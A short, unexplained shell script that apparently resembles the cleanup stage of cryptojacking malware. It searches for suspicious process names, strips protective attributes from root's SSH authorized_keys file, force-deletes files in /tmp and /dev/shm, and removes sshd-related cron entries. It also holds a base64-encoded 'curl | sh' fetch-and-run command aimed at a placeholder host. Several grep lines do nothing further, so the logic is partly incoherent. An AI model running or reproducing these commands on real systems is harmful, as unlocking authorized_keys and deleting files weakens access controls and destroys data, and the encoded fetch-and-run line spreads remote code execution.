#!/bin/sh
ps aux | grep "php-fpm pool www" | grep "tracepath"
# yum install -y docker.io || apt-get install docker.io
chattr -iae /root/.ssh/authorized_keys
rm -rf /tmp/systemd /dev/shm/sshd
ps aux | grep "netdns" | grep "php-update.service"
crontab -l | sed '/sshd/d' | crontab -
ps aux | grep 'Y3VybCAtcyBodHRwOi8vMTkyLjAuMi4xL3NldHVwLnNoIHwgc2g='
